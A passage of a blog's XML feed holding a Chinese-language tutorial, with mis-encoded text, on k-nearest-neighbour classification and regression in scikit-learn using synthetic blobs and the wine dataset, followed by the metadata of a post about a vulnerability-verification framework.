class="line">data = make_blobs(n_samples=<span class="number">1000</span>, centers=<span class="number">10</span>, random_state=<span class="number">8</span>)</span><br><span class="line">x, y = data</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>], c=y, cmap=plt.cm.spring, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>è¿è¡Œç¨‹åºï¼Œç”Ÿæˆæˆ‘ä»¬ç”Ÿæˆæ•°æ®é›†å±•ç¤ºå›¾ï¼š</p><p><img src="https://img.zhiiyun.com/e5ce88940b2fd35a7657518be769c2b2" alt=""></p><p>å¯ä»¥çœ‹åˆ°æ–°çš„æ•°æ®è¢«åˆ†æˆäº†10ç±»ï¼Œå…¶ä¸­æœ‰3ç±»æ•°æ®æœ‰ä¸€äº›é‡åˆï¼Œç„¶åé€šè¿‡Kæœ€è¿‘é‚»ç®—æ³•è¿›è¡Œæ‹Ÿåˆæ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæ•°æ®é›†</span></span><br><span class="line">data = make_blobs(n_samples=<span class="number">1000</span>, centers=<span class="number">10</span>, random_state=<span class="number">8</span>)</span><br><span class="line">x, y = data</span><br><span class="line"><span class="comment"># åˆ›å»ºKNNåˆ†ç±»å™¨</span></span><br><span class="line">clf = KNeighborsClassifier()</span><br><span class="line">clf.fit(x, y)</span><br><span class="line"><span class="comment"># ç»˜åˆ¶å›¾</span></span><br><span class="line">x_min, x_max = x[:, <span class="number">0</span>].min() - <span class="number">1</span>, x[:, <span class="number">0</span>].max() + <span class="number">1</span></span><br><span class="line">y_min, y_max = x[:, <span class="number">1</span>].min() - <span class="number">1</span>, x[:, <span class="number">1</span>].max() + <span class="number">1</span></span><br><span class="line">xx, yy = np.meshgrid(np.arange(x_min, x_max, <span class="number">.02</span>),</span><br><span class="line">                     np.arange(y_min, y_max, <span class="number">.02</span>))</span><br><span class="line">z = clf.predict(np.c_[xx.ravel(), yy.ravel()])</span><br><span class="line">z = z.reshape(xx.shape)</span><br><span class="line">plt.pcolormesh(xx, yy, z)</span><br><span class="line">plt.scatter(x[:, <span class="number">0</span>], x[:, <span class="number">1</span>], c=y, cmap=plt.cm.spring, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.xlim(xx.min(), xx.max())</span><br><span class="line">plt.ylim(yy.min(), yy.max())</span><br><span class="line">plt.title(<span class="string">"KNN"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>è¿è¡Œç¨‹åºä¼šå‡ºç°Kæœ€è¿‘é‚»ç®—æ³•æ‹Ÿåˆç»“æœï¼š</p><p><img src="https://img.zhiiyun.com/45e4d93cfec984e1acaedee45f64fb74" alt=""></p><p>å¯ä»¥çœ‹åˆ°Kæœ€è¿‘é‚»ç®—æ³•å°†å¤§éƒ¨åˆ†çš„æ•°æ®ç‚¹åˆ†ç±»åˆ°æ­£ç¡®çš„åˆ†ç±»ä¸­ï¼Œå•æœ‰ä¸€éƒ¨åˆ†å°æ•°æ®åˆ†å…¥äº†é”™è¯¯çš„åˆ†ç±»ä¸­ï¼Œåˆ†ç±»é”™è¯¯çš„æ•°æ®åŸºæœ¬ä¸ºé‡åˆçš„æ•°æ®ç‚¹ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»£ç è®¡ç®—Kæœ€è¿‘é‚»ç®—æ³•çš„æ­£ç¡®ç‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br><span class="line">print(<span class="string">"æ¨¡å‹æ­£ç¡®ç‡ï¼š&#123;:2f&#125;"</span>.format(clf.score(x,y)))</span><br><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/bdf78879a4015168e5e87da33277061d" alt=""></p><p>å¯ä»¥çœ‹å‡ºå°†æ•°æ®é›†æ ·æœ¬æå‡åˆ°1,000æ¡ï¼Œåˆ†ç±»æå‡åˆ°10ä¸­æ•°æ®ç±»å‹ï¼Œæ¨¡å‹çš„æ­£ç¡®ç‡ä¸º<code>91.7%</code>ã€‚</p><h2 id="å›å½’åˆ†æ"><a href="#å›å½’åˆ†æ" class="headerlink" title="å›å½’åˆ†æ"></a>å›å½’åˆ†æ</h2><p>é€šè¿‡scikit-learnä¸­çš„<code>make_regression</code>è¿›è¡Œç”Ÿæˆç”¨äºå›å½’åˆ†æçš„æ•°æ®é›†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_regression</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">x, y = make_regression(n_features=<span class="number">1</span>, n_informative=<span class="number">1</span>, noise=<span class="number">50</span>, random_state=<span class="number">8</span>)</span><br><span class="line">plt.scatter(x, y, c=<span class="string">'orange'</span>, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>å°†æ ·æœ¬çš„ç‰¹å¾æ•°é‡ä¸º1ä¸ªï¼Œå™ªéŸ³ä¸º50ï¼Œç„¶åè¿è¡Œç¨‹åºã€‚</p><p><img src="https://img.zhiiyun.com/4c3892c54c52834239e3a85a7f30c5d6" alt=""></p><p>ä¸Šå›¾å¯ä»¥çœ‹åˆ°æ¨ªè½´ï¼ˆXè½´ï¼‰ä¸ºæ ·æœ¬çš„ç‰¹å¾æ•°å€¼ï¼Œå¤§è‡´èŒƒå›´åœ¨-3~3ä¹‹é—´ï¼›çºµè½´ï¼ˆYè½´ï¼‰ä¸ºæ ·æœ¬çš„æµ‹å®šå€¼ï¼Œå¤§è‡´èŒƒå›´åœ¨-250~250ä¹‹é—´ã€‚</p><p>ç„¶åé€šè¿‡Kæœ€è¿‘é‚»ç®—æ³•æ¥è¿›è¡Œå›å½’æµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_regression</span><br><span class="line"><span class="comment"># KNN å›å½’æ¨¡å‹</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsRegressor</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x, y = make_regression(n_features=<span class="number">1</span>, n_informative=<span class="number">1</span>, noise=<span class="number">50</span>, random_state=<span class="number">8</span>)</span><br><span class="line">reg = KNeighborsRegressor()</span><br><span class="line"><span class="comment"># ä½¿ç”¨ KNN æ¨¡å‹è¿›è¡Œæ‹Ÿåˆæ•°æ®</span></span><br><span class="line">reg.fit(x, y)</span><br><span class="line">z = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, <span class="number">200</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">plt.scatter(x, y, c=<span class="string">'orange'</span>, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.plot(z, reg.predict(z), c=<span class="string">'k'</span>, linewidth=<span class="number">3</span>)</span><br><span class="line">plt.title(<span class="string">'KNN Regressor'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>è¿è¡Œç¨‹åºï¼Œç”Ÿæˆæ‹Ÿåˆç»“æœã€‚</p><p><img src="https://img.zhiiyun.com/56424c861925cfcff174a47c6fb3cb0d" alt=""></p><p>ä»å›¾ä¸­å¯ä»¥çœ‹å‡ºKæœ€è¿‘é‚»ç®—æ³•æ‹Ÿåˆç”Ÿæˆçš„æ•°æ®ï¼Œç›´è§‚æ¥çœ‹æ‹Ÿåˆç»“æœå¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œæœ‰å¤§é‡çš„æ•°æ®ç‚¹æ²¡æœ‰è¢«è¦†ç›–åˆ°ã€‚</p><p>é€šè¿‡<code>score</code>æ¥è¿›è¡Œè®¡ç®—æ¨¡å‹åˆ†æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br><span class="line">print(<span class="string">"æ¨¡å‹æ­£ç¡®ç‡ï¼š&#123;:2f&#125;"</span>.format(reg.score(x, y)))</span><br><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/dd42583901f5425d85cc9ff679f9bed6" alt=""></p><p>çœ‹ä¹Ÿçœ‹åˆ°æ¨¡å‹çš„æ­£ç¡®ç‡åªæœ‰<code>77.2%</code>ï¼Œè¯¥ç»“æœæ¯”è¾ƒå·®ã€‚ä¸ºäº†æé«˜æ­£ç¡®ç‡å¯ä»¥è¿›è¡Œé™ä½Kæœ€è¿‘é‚»ç®—æ³•çš„<code>n_neighbors</code>æ¥æé«˜å‡†ç¡®ç‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_regression</span><br><span class="line"><span class="comment"># KNN å›å½’æ¨¡å‹</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsRegressor</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x, y = make_regression(n_features=<span class="number">1</span>, n_informative=<span class="number">1</span>, noise=<span class="number">50</span>, random_state=<span class="number">8</span>)</span><br><span class="line">reg = KNeighborsRegressor(n_neighbors=<span class="number">2</span>)</span><br><span class="line">reg.fit(x, y)</span><br><span class="line">z = np.linspace(<span class="number">-3</span>, <span class="number">3</span>, <span class="number">200</span>).reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">plt.scatter(x, y, c=<span class="string">'orange'</span>, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.plot(z, reg.predict(z), c=<span class="string">'k'</span>, linewidth=<span class="number">3</span>)</span><br><span class="line">plt.title(<span class="string">'KNN Regressor'</span>)</span><br><span class="line">plt.show()</span><br><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br><span class="line">print(<span class="string">"æ¨¡å‹æ­£ç¡®ç‡ï¼š&#123;:2f&#125;"</span>.format(reg.score(x, y)))</span><br><span class="line">print(<span class="string">'='</span> * <span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>ä»£ç é€šè¿‡å°†Kæœ€è¿‘é‚»ç®—æ³•çš„<code>n_neighbors</code>è°ƒæ•´åˆ°2ï¼Œè¿è¡Œç¨‹åºï¼Œç”Ÿæˆæ‹Ÿåˆç»“æœä»¥åŠæ¨¡å‹äº‰å–ç‡ã€‚</p><p><img src="https://img.zhiiyun.com/b5e000b0e2325dfb3d13adca1a1e49e5" alt=""></p><p><img src="https://img.zhiiyun.com/16138082733bac56f183238d15774f1d" alt=""></p><p>å¯ä»¥çœ‹åˆ°ç›¸å¯¹ç¬¬ä¸€æ¬¡æ¥è¯´è¦†ç›–çš„æ•°æ®ç‚¹å˜å¤šï¼Œå‡†ç¡®ç‡ä»<code>77.2%</code>æå‡åˆ°<code>85.8%</code>ã€‚</p><h2 id="Kæœ€è¿‘é‚»ç®—æ³•å®æˆ˜-é…’åˆ†ç±»"><a href="#Kæœ€è¿‘é‚»ç®—æ³•å®æˆ˜-é…’åˆ†ç±»" class="headerlink" title="Kæœ€è¿‘é‚»ç®—æ³•å®æˆ˜-é…’åˆ†ç±»"></a>Kæœ€è¿‘é‚»ç®—æ³•å®æˆ˜-é…’åˆ†ç±»</h2><h3 id="æ•°æ®é›†åˆ†æ"><a href="#æ•°æ®é›†åˆ†æ" class="headerlink" title="æ•°æ®é›†åˆ†æ"></a>æ•°æ®é›†åˆ†æ</h3><p>æ•°æ®é›†æ¥è‡ªscikit-learnä¸­å†…ç½®çš„æ•°æ®é›†æ¥è¿›è¡Œè¯•éªŒï¼Œè¯¥æ•°æ®ä¸­åœ¨<code>datasets</code>æ¨¡å—ä¸­ã€‚</p><p>é¦–å…ˆåŠ è½½é…’æ•°æ®é›†åˆ°é¡¹ç›®ä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line">win_dataset = load_wine()</span><br><span class="line">print(win_dataset.keys())</span><br><span class="line">print(win_dataset[<span class="string">'DESCR'</span>])</span><br><span class="line">print(win_dataset[<span class="string">'data'</span>].shape)</span><br></pre></td></tr></table></figure><p>è¿è¡Œä»£ç å¯ä»¥çœ‹åˆ°åŠ è½½çš„æ•°æ®ã€‚</p><p><img src="https://img.zhiiyun.com/32aae9b908f7ddfddcfac1759508f3b5" alt=""></p><p>å¯ä»¥çœ‹åˆ°æ•°æ®é›†ä¸­ä¸»è¦æœ‰<code>&#39;data&#39;, &#39;target&#39;, &#39;target_names&#39;, &#39;DESCR&#39;, &#39;feature_names&#39;</code>ï¼Œå¯¹åº”<code>æ•°æ®,åˆ†ç±»ç›®æ ‡,åˆ†ç±»åç§°,æè¿°,ç‰¹å¾åç§°</code>ï¼Œä»¥åŠ178ä¸ªæ ·æœ¬æ•°æ®ï¼Œæ¯æ¡æ ·æœ¬æ•°æ®ä¸­æœ‰13ä¸ªç‰¹å¾ï¼Œä¸»è¦åˆ†ä¸º3ç±»ï¼ˆ<code>class_0,class_1,class_2</code>ï¼‰ï¼Œå…¶ä¸­<code>class_0</code>æœ‰59ä¸ªæ ·æœ¬ï¼Œ<code>class_1</code>æœ‰71ä¸ªæ ·æœ¬ï¼Œ<code>class_2</code>ä¸­æœ‰48ä¸ªæ ·æœ¬ã€‚<br>ç‰¹å¾ä¸»è¦åŒ…æ‹¬é…’ç²¾å«é‡ã€è‹¹æœé…¸ã€é•å«é‡ã€é’èŠ±ç´ å«é‡ã€è‰²å½©é¥±å’Œåº¦ç­‰ç­‰ã€‚</p><h3 id="ç”Ÿæˆè®­ç»ƒé›†å’Œæµ‹è¯•é›†"><a href="#ç”Ÿæˆè®­ç»ƒé›†å’Œæµ‹è¯•é›†" class="headerlink" title="ç”Ÿæˆè®­ç»ƒé›†å’Œæµ‹è¯•é›†"></a>ç”Ÿæˆè®­ç»ƒé›†å’Œæµ‹è¯•é›†</h3><p>åˆ›å»ºä¸€ä¸ªè‡ªåŠ¨å°†é…’åˆ†ç±»çš„æœºå™¨ç®—æ³•æ¨¡å‹ä¹‹å‰ï¼Œéœ€è¦èƒ½å¤Ÿå¯¹æ¨¡å‹çš„å¯ä¿¡åº¦è¿›è¡Œè¯„åˆ¤ï¼Œå¦åˆ™æˆ‘ä»¬æ— æ³•çŸ¥é“é’ˆå¯¹æ–°çš„é…’è¿›è¡Œçš„åˆ†ç±»æ˜¯å¦æ­£ç¡®ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æ•°æ®é›†æ‹†åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šä¸€éƒ¨åˆ†ç§°ä¸ºè®­ç»ƒé›†ï¼›å¦ä¸€éƒ¨åˆ†ä¸ºæµ‹è¯•é›†ã€‚</p><p>ä½¿ç”¨scikit-learnä¸­çš„<code>train_test_split</code>å‡½æ•°è¿›è¡Œæ‹†åˆ†æ•°æ®é›†ï¼Œè¯¥å‡½æ•°å¯ä»¥å°†æ•°æ®é›†è¿›è¡Œéšæœºæ’åˆ—ï¼Œé»˜è®¤æƒ…å†µä¸‹75%çš„æ•°æ®ä»¥åŠå¯¹åº”çš„æ ‡ç­¾åˆ’åˆ†åˆ°è®­ç»ƒé›†ï¼Œ25%çš„æ•°æ®é›†åˆ’åˆ†åˆ°æµ‹è¯•é›†ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">win_dataset = load_wine()</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(win_dataset[<span class="string">'data'</span>], win_dataset[<span class="string">'target'</span>], random_state=<span class="number">0</span>)</span><br><span class="line">print(<span class="string">'X_train shape:&#123;&#125;'</span>.format(X_train.shape))</span><br><span class="line">print(<span class="string">'X_test shape:&#123;&#125;'</span>.format(X_test.shape))</span><br><span class="line">print(<span class="string">'y_train shape:&#123;&#125;'</span>.format(y_train.shape))</span><br><span class="line">print(<span class="string">'y_test shape:&#123;&#125;'</span>.format(y_test.shape))</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/05c5977fc1669d54ba4e89dab533ea25" alt=""></p><p>å¯ä»¥çœ‹å‡ºåœ¨æ ·æœ¬æ€»æ•°é‡178ä¸ªä¸­è®­ç»ƒé›†ä»¥åŠå¯¹åº”çš„æ ‡ç­¾æœ‰133ä¸ªçº¦å ï¼ˆ74.7%ï¼‰ï¼Œæµ‹è¯•é›†ä»¥åŠæ ‡ç­¾å…±æœ‰45ä¸ªï¼Œçº¦å ï¼ˆ25.3%ï¼‰ï¼Œç‰¹å¾æ•°é‡ä¸º13ä¸ªã€‚</p><h3 id="å»ºæ¨¡"><a href="#å»ºæ¨¡" class="headerlink" title="å»ºæ¨¡"></a>å»ºæ¨¡</h3><p>ä½¿ç”¨scikit-learnçš„Kæœ€è¿‘é‚»ç®—æ³•è¿›è¡Œåˆ†ç±»ï¼Œç„¶ååŸºäºè®­ç»ƒæ•°æ®é›†è¿›è¡Œè®­ç»ƒå»ºæ¨¡ï¼Œåœ¨è®­ç»ƒæ•°æ®é›†ä¸­è¿›è¡Œå¯»æ‰¾å’Œæ–°è¾“å…¥çš„æ•°æ®æœ€è¿‘çš„æ•°æ®ç‚¹ï¼Œç„¶åå°†è¿™ä¸ªæ•°æ®ç‚¹çš„æ ‡ç­¾åˆ†é…ç»™æ–°çš„æ•°æ®ç‚¹ï¼Œä»¥æ­¤å¯¹æ–°çš„æ ·æœ¬è¿›è¡Œåˆ†ç±»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>å¯¼å…¥KNNåˆ†ç±»æ¨¡å‹ï¼Œç„¶åå°†<code>n_neighbors</code>å‚æ•°å€¼è®¾ç½®ä¸º1ï¼Œ<code>n_neighbors</code>ä¸ºKæœ€è¿‘é‚»ç®—æ³•ä¸­çš„è¿‘é‚»æ•°æ®ã€‚</p><p>ç„¶åé€šè¿‡<code>knn</code>æ¥è¿›è¡Œâ€œæ‹Ÿåˆï¼ˆ<code>fit</code>ï¼‰â€çš„æ–¹æ³•æ¥è¿›è¡Œå»ºæ¨¡ï¼Œå»ºæ¨¡çš„ä¾æ®å°±æ˜¯è®­ç»ƒé›†ä¸­æ ·æœ¬æ•°æ®<code>X_train</code>ä»¥åŠå¯¹åº”çš„<code>y_train</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">1</span>)</span><br><span class="line">win_dataset = load_wine()</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(win_dataset[<span class="string">'data'</span>], win_dataset[<span class="string">'target'</span>], random_state=<span class="number">0</span>)</span><br><span class="line">knn.fit(X_train,y_train)</span><br><span class="line">print(knn)</span><br></pre></td></tr></table></figure><h3 id="æ–°æ ·æœ¬åˆ†ç±»é¢„æµ‹"><a href="#æ–°æ ·æœ¬åˆ†ç±»é¢„æµ‹" class="headerlink" title="æ–°æ ·æœ¬åˆ†ç±»é¢„æµ‹"></a>æ–°æ ·æœ¬åˆ†ç±»é¢„æµ‹</h3><h4 id="æµ‹è¯•é›†æ ·æœ¬åˆ†ç±»"><a href="#æµ‹è¯•é›†æ ·æœ¬åˆ†ç±»" class="headerlink" title="æµ‹è¯•é›†æ ·æœ¬åˆ†ç±»"></a>æµ‹è¯•é›†æ ·æœ¬åˆ†ç±»</h4><p>å°†è®­ç»ƒå¥½çš„æ¨¡å‹ç”¨äºè¿›è¡Œè®­ç»ƒæµ‹è¯•é›†æ ·æœ¬çš„å‡†ç¡®ç‡ï¼Œæ¥é’ˆå¯¹æ¨¡å‹è¿›è¡Œæ‰“åˆ†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_wine</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line">knn = KNeighborsClassifier(n_neighbors=<span class="number">1</span>)</span><br><span class="line">win_dataset = load_wine()</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(win_dataset[<span class="string">'data'</span>], win_dataset[<span class="string">'target'</span>], random_state=<span class="number">0</span>)</span><br><span class="line">knn.fit(X_train,y_train)</span><br><span class="line">print(knn)</span><br><span class="line">print(<span class="string">'æµ‹è¯•é›†æ ·æœ¬é¢„æµ‹'</span>, knn.score(X_test, y_test))</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/a76be89034096ac9866dc6bbcbe2e6df" alt=""></p><p>å¯ä»¥çœ‹åˆ°æ¨¡å‹é’ˆå¯¹æµ‹è¯•é›†æ ·æœ¬çš„é¢„æµ‹æ­£ç¡®çš„æ¦‚ç‡ä¸º75.5%ã€‚</p><h4 id="æ–°æ ·æœ¬é¢„æµ‹"><a href="#æ–°æ ·æœ¬é¢„æµ‹" class="headerlink" title="æ–°æ ·æœ¬é¢„æµ‹"></a>æ–°æ ·æœ¬é¢„æµ‹</h4><p>å‡è®¾ç›®å‰æœ‰ä¸€ç“¶æ–°çš„çº¢é…’ä»¥åŠå¯¹åº”çš„ç‰¹å¾è¿›è¡Œä½¿ç”¨æ¨¡å‹é¢„æµ‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X_new = np.array([[<span class="number">13.2</span>, <span class="number">2.77</span>, <span class="number">2.51</span>, <span class="number">18.5</span>, <span class="number">96.6</span>, <span class="number">1.04</span>, <span class="number">2.55</span>, <span class="number">0.57</span>, <span class="number">1.47</span>, <span class="number">6.2</span>, <span class="number">1.05</span>, <span class="number">3.33</span>, <span class="number">820</span>]])</span><br><span class="line">production = knn.predict(X_new)</span><br><span class="line">print(<span class="string">'é¢„æµ‹çº¢é…’çš„ç±»åˆ«ä¸º'</span>, win_dataset[<span class="string">'target_names'</span>][production])</span><br></pre></td></tr></table></figure><p><img src="https://img.zhiiyun.com/4076a7cf384e88614ffb3369fa2adcb6" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Kæœ€è¿‘é‚»ï¼ˆkNNï¼Œk-NearestNeighborï¼‰ä¹Ÿç§°è¿‘é‚»ç®—æ³•ï¼Œä¸»è¦ç”¨äºæ•°æ®æŒ–æ˜åˆ†ç±»æŠ€æœ¯ä¸­æœ€ç®€å•å¸¸è§çš„ä¸€ç§ç®—æ³•ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åŸç†&quot;&gt;&lt;a href=&quot;#åŸç†&quot; class=&quot;headerlink&quot; title=&quot;åŸç†&quot;&gt;&lt;/a&gt;åŸç†&lt;/h2&gt;&lt;p&gt;Kæœ€è¿‘é‚»
      
    
    </summary>
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://www.r4v3zn.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="æœºå™¨å­¦ä¹ " scheme="http://www.r4v3zn.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Kæœ€è¿‘é‚»ç®—æ³•" scheme="http://www.r4v3zn.com/tags/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/"/>
    
      <category term="è¿‘é‚»ç®—æ³•" scheme="http://www.r4v3zn.com/tags/%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€æ¬¾æ¼æ´éªŒè¯æ¡†æ¶çš„æ„æ€</title>
    <link href="http://www.r4v3zn.com/posts/403bc5b/"/>
    <id>http://www.r4v3zn.com/posts/403bc5b/</id>
    <published>2019-08-02T04:40:41.000Z</published>
    <updated>2020-11-11T08:06:56.259Z</updated>
    
